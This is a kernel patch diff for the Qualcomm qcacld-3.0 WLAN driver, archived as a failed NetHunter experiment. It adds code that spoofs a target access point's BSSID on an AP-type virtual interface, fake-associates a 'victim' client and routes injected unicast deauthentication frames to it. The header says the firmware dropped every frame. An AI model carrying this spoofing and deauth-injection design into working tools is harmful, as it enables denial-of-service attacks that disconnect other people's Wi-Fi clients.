# 单播 Deauth 内置卡探索 E1-E5(全部失败,固件硬限制)—— 参考存档,请勿应用
#
# 结论:peach_v2 签名固件对【从注入 helper vdev 发出的单播管理帧】一律静默吞,
#       无论 vdev 类型(STA/AP)、关联状态、peer_assoc 速率集、retry_limit、beacon。
#       六轮 completed 始终=0。host 侧无可调旋钮(见 wmi_mgmt_tx_send_cmd 接口契约)。
#       单播需求 -> 外置 USB 网卡。详见 实战记录 §11.5。
# 基线:r8.1 (补丁集 0001-0015)。本 diff 仅供未来固件逆向/换思路时参考。
#
#  .../wlan/qcacld-3.0/core/wma/src/wma_mgmt.c        | 467 ++++++++++++++++++++-
#  1 file changed, 466 insertions(+), 1 deletion(-)

diff --git a/vendor/qcom/opensource/wlan/qcacld-3.0/core/wma/src/wma_mgmt.c b/vendor/qcom/opensource/wlan/qcacld-3.0/core/wma/src/wma_mgmt.c
index b28fef96..b289c238 100644
--- a/vendor/qcom/opensource/wlan/qcacld-3.0/core/wma/src/wma_mgmt.c
+++ b/vendor/qcom/opensource/wlan/qcacld-3.0/core/wma/src/wma_mgmt.c
@@ -39,6 +39,7 @@
 #include "qdf_types.h"
 #include "qdf_mem.h"
 #include "qdf_time.h"
+#include "qdf_defer.h"
 
 #include "wma_types.h"
 #include "lim_api.h"
@@ -3315,6 +3316,421 @@ static struct wma_inj_tx_vdev {
 	uint8_t mac_addr[QDF_MAC_ADDR_SIZE];
 } g_inj_tx_vdev;
 
+/*
+ * NETHUNTER unicast deauth (E4): E1-E3 proved that the hidden *STA* helper vdev
+ * cannot transmit a unicast frame no matter what host-side setup we add (peer,
+ * vdev_up fake-assoc, peer_assoc rateset, retry_limit) - the FW silently drops
+ * every one (completed stayed 0 while broadcast on the same vdev completed
+ * fine). The firmware gates unicast on the *sending vdev type*: a STA helper
+ * that never truly associated over the air cannot source a unicast mgmt frame.
+ *
+ * E4 changes the sending vdev entirely: bring up a dedicated *AP*-type vdev
+ * whose own MAC == the target AP's BSSID, give it a minimal beacon template (an
+ * AP vdev without one crashes FW beacon-tx-offload - see Phase 2b), then add
+ * the victim client as a peer. An AP deauthing its own client is the firmware's
+ * normal "kick" path, so it should transmit RA=victim (the AP->client deauth)
+ * for real. Because our AP vdev's BSSID IS the real AP's, the victim sees a
+ * deauth genuinely from the BSS it is on and disconnects - and only it does.
+ *
+ * Now it is the AP->client direction (RA=victim, RA!=BSSID) that we send; the
+ * STA->AP direction is dropped. Injection of these frames is routed out the AP
+ * vdev (not the broadcast STA helper). Bring-up is a SLEEPING WMI sequence run
+ * in a worker; frames are dropped until the AP vdev is up.
+ *
+ * Gated entirely on unicast deauth/disassoc - broadcast deauth never enters
+ * here and its stable r8.1 path (STA helper g_inj_tx_vdev) is untouched.
+ */
+#define WMA_INJ_AP_BCN_MAX  128
+#define WMA_INJ_NO_VDEV     0xff
+
+enum wma_inj_uc_state {
+	WMA_INJ_UC_IDLE,	/* no target - nothing to do */
+	WMA_INJ_UC_PENDING,	/* worker bringing the AP vdev up */
+	WMA_INJ_UC_UP,		/* AP vdev up, victim peered - sendable */
+};
+
+static struct wma_inj_uc_ctx {
+	qdf_spinlock_t lock;
+	qdf_work_t work;
+	enum wma_inj_uc_state state;
+	uint8_t ap[QDF_MAC_ADDR_SIZE];		/* target AP = our AP vdev MAC */
+	uint8_t victim[QDF_MAC_ADDR_SIZE];	/* client to kick = AP vdev peer */
+	uint8_t ap_vdev_id;			/* the AP-type vdev (0xff = none) */
+	bool work_busy;				/* worker queued/running */
+	bool inited;
+} g_inj_uc;
+
+/* Build a minimal hidden-SSID beacon for the AP helper vdev so FW beacon-tx
+ * offload has a template (an AP vdev without one asserts). Returns the frame
+ * length and writes the TIM IE offset (FW needs it).
+ */
+static uint32_t wma_inject_uc_build_beacon(uint8_t *buf, const uint8_t *bssid,
+					   uint8_t chan, uint32_t *tim_off)
+{
+	uint8_t *p = buf;
+
+	*p++ = 0x80; *p++ = 0x00;		/* FC: beacon */
+	*p++ = 0x00; *p++ = 0x00;		/* duration */
+	qdf_mem_set(p, QDF_MAC_ADDR_SIZE, 0xff); p += QDF_MAC_ADDR_SIZE; /* DA */
+	qdf_mem_copy(p, bssid, QDF_MAC_ADDR_SIZE); p += QDF_MAC_ADDR_SIZE; /* SA */
+	qdf_mem_copy(p, bssid, QDF_MAC_ADDR_SIZE); p += QDF_MAC_ADDR_SIZE; /* BSSID */
+	*p++ = 0x00; *p++ = 0x00;		/* seq ctrl */
+	qdf_mem_set(p, 8, 0); p += 8;		/* timestamp */
+	*p++ = 0x64; *p++ = 0x00;		/* beacon interval 100 TU */
+	*p++ = 0x01; *p++ = 0x00;		/* capability: ESS */
+	*p++ = 0x00; *p++ = 0x00;		/* SSID IE: hidden (len 0) */
+	*p++ = 0x01; *p++ = 0x08;		/* Supported rates IE */
+	*p++ = 0x8c; *p++ = 0x12; *p++ = 0x98; *p++ = 0x24;
+	*p++ = 0xb0; *p++ = 0x48; *p++ = 0x60; *p++ = 0x6c;
+	*p++ = 0x03; *p++ = 0x01; *p++ = chan;	/* DS Param: channel */
+	*tim_off = (uint32_t)(p - buf);
+	*p++ = 0x05; *p++ = 0x04;		/* TIM IE */
+	*p++ = 0x00; *p++ = 0x01; *p++ = 0x00; *p++ = 0x00;
+
+	return (uint32_t)(p - buf);
+}
+
+/* Sleepable: stand up an AP-type vdev (MAC=ap) on the monitor channel with a
+ * beacon template, and add the victim as a peer. *out_vid gets the vdev id on
+ * success. Self-cleans on any failure.
+ */
+static QDF_STATUS wma_inject_uc_bringup_ap(tp_wma_handle wma, const uint8_t *ap,
+					   const uint8_t *victim, uint32_t freq,
+					   uint8_t *out_vid)
+{
+	struct vdev_create_params vcreate = {0};
+	struct vdev_start_params vstart = {0};
+	struct beacon_tmpl_params bcn = {0};
+	struct vdev_up_params vup = {0};
+	struct peer_create_params pcreate = {0};
+	struct peer_assoc_params pa = {0};
+	uint8_t bcn_buf[WMA_INJ_AP_BCN_MAX];
+	uint32_t bcn_len, tim_off = 0;
+	uint8_t chan, vid = WMA_INJ_NO_VDEV;
+	int i, fw_max_vid;
+	/* 5 GHz legacy OFDM basic rates (units of 500 kbps): 6..54 Mbps */
+	static const uint8_t uc_ofdm_rates[] = {
+		0x0c, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c
+	};
+	QDF_STATUS status;
+
+	/* free vdev slot, skipping monitor and the STA broadcast helper */
+	fw_max_vid = CFG_TGT_NUM_VDEV - 1;
+	if (fw_max_vid >= (int)wma->max_bssid)
+		fw_max_vid = (int)wma->max_bssid - 1;
+	for (i = fw_max_vid; i >= 0; i--) {
+		if ((uint8_t)i == g_inj_tx_vdev.mon_vdev_id ||
+		    (uint8_t)i == g_inj_tx_vdev.vdev_id)
+			continue;
+		if (!wma->interfaces[i].vdev) {
+			vid = (uint8_t)i;
+			break;
+		}
+	}
+	if (vid == WMA_INJ_NO_VDEV) {
+		wma_err("NETHUNTER-INJ: [uc] no free vdev slot for AP helper");
+		return QDF_STATUS_E_RESOURCES;
+	}
+
+	chan = (freq >= 5000) ? (uint8_t)((freq - 5000) / 5)
+			      : (uint8_t)((freq - 2407) / 5);
+
+	/* 1. vdev_create AP, own MAC == target AP BSSID */
+	vcreate.vdev_id = vid;
+	vcreate.type    = WMI_VDEV_TYPE_AP;
+	vcreate.subtype = 0;
+	vcreate.nss_2g  = 1;
+	vcreate.nss_5g  = 1;
+	vcreate.pdev_id = 0;
+	status = wmi_unified_vdev_create_send(wma->wmi_handle,
+					      (uint8_t *)ap, &vcreate);
+	if (QDF_IS_STATUS_ERROR(status)) {
+		wma_err("NETHUNTER-INJ: [uc] AP vdev_create %pM FAILED %d", ap, status);
+		return status;
+	}
+	qdf_sleep(WMA_INJ_VDEV_SETTLE_MS);
+
+	/* 2. vdev_start as a beaconing AP on the monitor channel */
+	vstart.vdev_id         = vid;
+	vstart.beacon_interval = 100;
+	vstart.dtim_period     = 1;
+	vstart.channel.mhz     = freq;
+	vstart.channel.cfreq1  = freq;
+	vstart.channel.cfreq2  = 0;
+	vstart.channel.phy_mode = (enum wlan_phymode)wmi_host_to_fw_phymode(
+			(freq < 4000) ? WLAN_PHYMODE_11G : WLAN_PHYMODE_11A);
+	vstart.channel.maxpower    = 20;
+	vstart.channel.maxregpower = 20;
+	status = wmi_unified_vdev_start_send(wma->wmi_handle, &vstart);
+	if (QDF_IS_STATUS_ERROR(status)) {
+		wma_err("NETHUNTER-INJ: [uc] AP vdev_start %u FAILED %d", vid, status);
+		goto err_delete;
+	}
+	qdf_sleep(WMA_INJ_VDEV_SETTLE_MS);
+
+	/* 3. beacon template (required - no template => FW beacon offload asserts) */
+	bcn_len = wma_inject_uc_build_beacon(bcn_buf, ap, chan, &tim_off);
+	bcn.vdev_id          = vid;
+	bcn.tim_ie_offset    = tim_off;
+	bcn.tmpl_len         = bcn_len;
+	bcn.tmpl_len_aligned = roundup(bcn_len, sizeof(uint32_t));
+	bcn.frm              = bcn_buf;
+	status = wmi_unified_beacon_tmpl_send_cmd(wma->wmi_handle, &bcn);
+	if (QDF_IS_STATUS_ERROR(status)) {
+		wma_err("NETHUNTER-INJ: [uc] AP beacon_tmpl %u FAILED %d", vid, status);
+		goto err_stop;
+	}
+	qdf_sleep(WMA_INJ_PEER_SETTLE_MS);
+
+	/* 4. vdev_up - AP now beaconing */
+	vup.vdev_id = vid;
+	status = wmi_unified_vdev_up_send(wma->wmi_handle, (uint8_t *)ap, &vup);
+	if (QDF_IS_STATUS_ERROR(status)) {
+		wma_err("NETHUNTER-INJ: [uc] AP vdev_up %u FAILED %d", vid, status);
+		goto err_stop;
+	}
+	qdf_sleep(WMA_INJ_PEER_SETTLE_MS);
+
+	/* 5. add the victim as a client peer of our AP */
+	pcreate.peer_addr = (uint8_t *)victim;
+	pcreate.peer_type = WMI_PEER_TYPE_DEFAULT;
+	pcreate.vdev_id   = vid;
+	status = wmi_unified_peer_create_send(wma->wmi_handle, &pcreate);
+	if (QDF_IS_STATUS_ERROR(status)) {
+		wma_err("NETHUNTER-INJ: [uc] victim peer_create %pM on AP vdev %u FAILED %d",
+			victim, vid, status);
+		wmi_unified_vdev_down_send(wma->wmi_handle, vid);
+		qdf_sleep(WMA_INJ_PEER_SETTLE_MS);
+		goto err_stop;
+	}
+	qdf_sleep(WMA_INJ_PEER_SETTLE_MS);
+
+	/* 6. peer_assoc the victim (E5): a real AP runs peer_assoc for each
+	 * client it accepts - this is what gives the peer a rateset so the FW
+	 * can build a PPDU for it. E4 skipped it and unicast stayed completed=0;
+	 * this is the one untried step that completes the AP<->client relation.
+	 * Non-fatal: if it fails we still try to TX (log and continue).
+	 */
+	pa.vdev_id            = vid;
+	pa.peer_new_assoc     = 1;
+	pa.peer_associd       = 1;
+	pa.peer_nss           = 1;
+	pa.peer_phymode       = (freq < 4000) ? WLAN_PHYMODE_11G : WLAN_PHYMODE_11A;
+	pa.peer_listen_intval = 1;
+	qdf_mem_copy(pa.peer_mac, victim, QDF_MAC_ADDR_SIZE);
+	pa.peer_legacy_rates.num_rates = sizeof(uc_ofdm_rates);
+	qdf_mem_copy(pa.peer_legacy_rates.rates, uc_ofdm_rates,
+		     sizeof(uc_ofdm_rates));
+	pa.qos_flag = 1;
+	if (QDF_IS_STATUS_ERROR(wmi_unified_peer_assoc_send(wma->wmi_handle,
+							    &pa)))
+		wma_err("NETHUNTER-INJ: [uc] victim peer_assoc %pM on AP vdev %u FAILED (continuing)",
+			victim, vid);
+	else
+		wma_info("NETHUNTER-INJ: [uc] victim %pM peer_assoc'd on AP vdev %u",
+			 victim, vid);
+	qdf_sleep(WMA_INJ_PEER_SETTLE_MS);
+
+	*out_vid = vid;
+	return QDF_STATUS_SUCCESS;
+
+err_stop:
+	{
+		struct vdev_stop_params vstop_e = {0};
+
+		vstop_e.vdev_id = vid;
+		wmi_unified_vdev_stop_send(wma->wmi_handle, &vstop_e);
+	}
+	qdf_sleep(WMA_INJ_PEER_SETTLE_MS);
+err_delete:
+	wmi_unified_vdev_delete_send(wma->wmi_handle, vid);
+	qdf_sleep(WMA_INJ_PEER_SETTLE_MS);
+	return status;
+}
+
+/* Sleepable: full teardown of the AP helper vdev. */
+static void wma_inject_uc_teardown_ap(tp_wma_handle wma, uint8_t vid,
+				      const uint8_t *victim)
+{
+	struct vdev_stop_params vstop = {0};
+	struct peer_delete_cmd_params pdel = {0};
+
+	pdel.vdev_id = vid;
+	wmi_unified_peer_delete_send(wma->wmi_handle, (uint8_t *)victim, &pdel);
+	qdf_sleep(WMA_INJ_PEER_SETTLE_MS);
+	wmi_unified_vdev_down_send(wma->wmi_handle, vid);
+	qdf_sleep(WMA_INJ_PEER_SETTLE_MS);
+	vstop.vdev_id = vid;
+	wmi_unified_vdev_stop_send(wma->wmi_handle, &vstop);
+	qdf_sleep(WMA_INJ_PEER_SETTLE_MS);
+	wmi_unified_vdev_delete_send(wma->wmi_handle, vid);
+	qdf_sleep(WMA_INJ_PEER_SETTLE_MS);
+}
+
+/*
+ * Sleepable worker: stand up the AP helper vdev for the requested target so the
+ * firmware will transmit the AP->client deauth (RA=victim) for real.
+ */
+static void wma_inject_uc_worker(void *arg)
+{
+	tp_wma_handle wma = cds_get_context(QDF_MODULE_ID_WMA);
+	uint8_t ap[QDF_MAC_ADDR_SIZE], victim[QDF_MAC_ADDR_SIZE];
+	uint8_t vid = WMA_INJ_NO_VDEV;
+	uint32_t freq;
+
+	(void)arg;
+
+	if (wma_validate_handle(wma) || !wma->wmi_handle) {
+		qdf_spin_lock_bh(&g_inj_uc.lock);
+		g_inj_uc.work_busy = false;
+		qdf_spin_unlock_bh(&g_inj_uc.lock);
+		return;
+	}
+
+	for (;;) {
+		qdf_spin_lock_bh(&g_inj_uc.lock);
+		if (g_inj_uc.state != WMA_INJ_UC_PENDING) {
+			/* nothing to bring up - release the gate atomically with
+			 * the check so a softirq queueing a new target reschedules
+			 * us (no lost wakeup).
+			 */
+			g_inj_uc.work_busy = false;
+			qdf_spin_unlock_bh(&g_inj_uc.lock);
+			return;
+		}
+		qdf_mem_copy(ap, g_inj_uc.ap, QDF_MAC_ADDR_SIZE);
+		qdf_mem_copy(victim, g_inj_uc.victim, QDF_MAC_ADDR_SIZE);
+		qdf_spin_unlock_bh(&g_inj_uc.lock);
+
+		freq = g_inj_tx_vdev.chanfreq;	/* monitor channel */
+
+		if (QDF_IS_STATUS_ERROR(wma_inject_uc_bringup_ap(
+				wma, ap, victim, freq, &vid))) {
+			qdf_spin_lock_bh(&g_inj_uc.lock);
+			if (g_inj_uc.state == WMA_INJ_UC_PENDING &&
+			    !qdf_mem_cmp(g_inj_uc.ap, ap, QDF_MAC_ADDR_SIZE))
+				g_inj_uc.state = WMA_INJ_UC_IDLE;
+			qdf_spin_unlock_bh(&g_inj_uc.lock);
+			continue;
+		}
+
+		qdf_spin_lock_bh(&g_inj_uc.lock);
+		if (g_inj_uc.state == WMA_INJ_UC_PENDING &&
+		    !qdf_mem_cmp(g_inj_uc.ap, ap, QDF_MAC_ADDR_SIZE)) {
+			g_inj_uc.ap_vdev_id = vid;
+			g_inj_uc.state = WMA_INJ_UC_UP;
+			qdf_spin_unlock_bh(&g_inj_uc.lock);
+			wma_info("NETHUNTER-INJ: [uc] AP helper vdev %u UP as BSSID %pM, victim %pM peered - AP->client deauth (RA=victim) will now be SENT (watch completion + whether only the victim drops)",
+				 vid, ap, victim);
+		} else {
+			/* target changed/cancelled while we built it - tear down */
+			qdf_spin_unlock_bh(&g_inj_uc.lock);
+			wma_inject_uc_teardown_ap(wma, vid, victim);
+		}
+	}
+}
+
+/*
+ * Tear the AP helper down (helper vdev destroy / channel restart). Sleepable.
+ * Flushes the worker first so it cannot bring an AP up after we tear down.
+ */
+static void wma_inject_uc_flush(tp_wma_handle wma)
+{
+	uint8_t victim[QDF_MAC_ADDR_SIZE];
+	uint8_t vid;
+	bool was_up;
+
+	if (!g_inj_uc.inited)
+		return;
+
+	qdf_flush_work(&g_inj_uc.work);
+
+	qdf_spin_lock_bh(&g_inj_uc.lock);
+	was_up = (g_inj_uc.state == WMA_INJ_UC_UP);
+	vid = g_inj_uc.ap_vdev_id;
+	qdf_mem_copy(victim, g_inj_uc.victim, QDF_MAC_ADDR_SIZE);
+	g_inj_uc.state = WMA_INJ_UC_IDLE;
+	g_inj_uc.ap_vdev_id = WMA_INJ_NO_VDEV;
+	g_inj_uc.work_busy = false;
+	qdf_spin_unlock_bh(&g_inj_uc.lock);
+
+	if (!was_up || vid == WMA_INJ_NO_VDEV ||
+	    !wma || wma_validate_handle(wma) || !wma->wmi_handle)
+		return;	/* nothing brought up, or WMI gone - dies with the vdev */
+
+	wma_inject_uc_teardown_ap(wma, vid, victim);
+	wma_info("NETHUNTER-INJ: [uc] torn down AP helper vdev %u", vid);
+}
+
+enum wma_inj_uc_action {
+	WMA_INJ_UC_PASS,	/* inject as usual (broadcast, or AP up) */
+	WMA_INJ_UC_DROP,	/* drop this frame (AP pending / not sendable) */
+};
+
+/*
+ * Softirq side. For a unicast deauth/disassoc in the AP->client direction
+ * (RA=victim, RA!=BSSID), make sure the AP helper vdev is up for that BSSID and
+ * the victim is peered; PASS once it is (and route the frame out the AP vdev via
+ * *tx_vdev_io), DROP while the worker brings it up. STA->AP frames and anything
+ * not-unicast-deauth either PASS (broadcast - untouched) or DROP (not sendable).
+ */
+static enum wma_inj_uc_action
+wma_inject_uc_prep(const uint8_t *frame, uint32_t frame_len,
+		   uint8_t *tx_vdev_io)
+{
+	const uint8_t *ra, *bssid;
+	uint8_t fc0, subtype;
+
+	if (!g_inj_tx_vdev.created || !g_inj_uc.inited || frame_len < 24)
+		return WMA_INJ_UC_PASS;
+
+	fc0 = frame[0];
+	if (((fc0 >> 2) & 0x3) != 0)		/* not a mgmt frame */
+		return WMA_INJ_UC_PASS;
+	subtype = (fc0 >> 4) & 0xf;
+	if (subtype != 0xc && subtype != 0xa)	/* deauth(12) / disassoc(10) */
+		return WMA_INJ_UC_PASS;
+
+	ra = frame + 4;				/* addr1 = RA */
+	if (ra[0] & 0x01)			/* broadcast/multicast - untouched */
+		return WMA_INJ_UC_PASS;
+
+	/* E4 sends the AP->client direction: RA=victim, BSSID=AP, RA != BSSID. */
+	bssid = frame + 16;			/* addr3 = BSSID */
+	if (!qdf_mem_cmp(ra, bssid, QDF_MAC_ADDR_SIZE))
+		return WMA_INJ_UC_DROP;		/* STA->AP direction - not used */
+
+	qdf_spin_lock_bh(&g_inj_uc.lock);
+	if (g_inj_uc.state == WMA_INJ_UC_UP &&
+	    !qdf_mem_cmp(g_inj_uc.ap, bssid, QDF_MAC_ADDR_SIZE) &&
+	    !qdf_mem_cmp(g_inj_uc.victim, ra, QDF_MAC_ADDR_SIZE)) {
+		*tx_vdev_io = g_inj_uc.ap_vdev_id;	/* route out the AP vdev */
+		qdf_spin_unlock_bh(&g_inj_uc.lock);
+		return WMA_INJ_UC_PASS;
+	}
+	if (g_inj_uc.state != WMA_INJ_UC_IDLE) {
+		/* bring-up in flight, or up on a different target (single target
+		 * only) - drop quietly; re-set the channel to retarget.
+		 */
+		qdf_spin_unlock_bh(&g_inj_uc.lock);
+		return WMA_INJ_UC_DROP;
+	}
+	/* IDLE: request an AP helper for this BSSID/victim */
+	qdf_mem_copy(g_inj_uc.ap, bssid, QDF_MAC_ADDR_SIZE);
+	qdf_mem_copy(g_inj_uc.victim, ra, QDF_MAC_ADDR_SIZE);
+	g_inj_uc.state = WMA_INJ_UC_PENDING;
+	if (!g_inj_uc.work_busy) {
+		g_inj_uc.work_busy = true;
+		qdf_spin_unlock_bh(&g_inj_uc.lock);
+		qdf_sched_work(0, &g_inj_uc.work);
+	} else {
+		qdf_spin_unlock_bh(&g_inj_uc.lock);
+	}
+	wma_info("NETHUNTER-INJ: [uc] new unicast target: AP %pM victim %pM - standing up AP helper vdev (frames dropped until up)",
+		 bssid, ra);
+	return WMA_INJ_UC_DROP;
+}
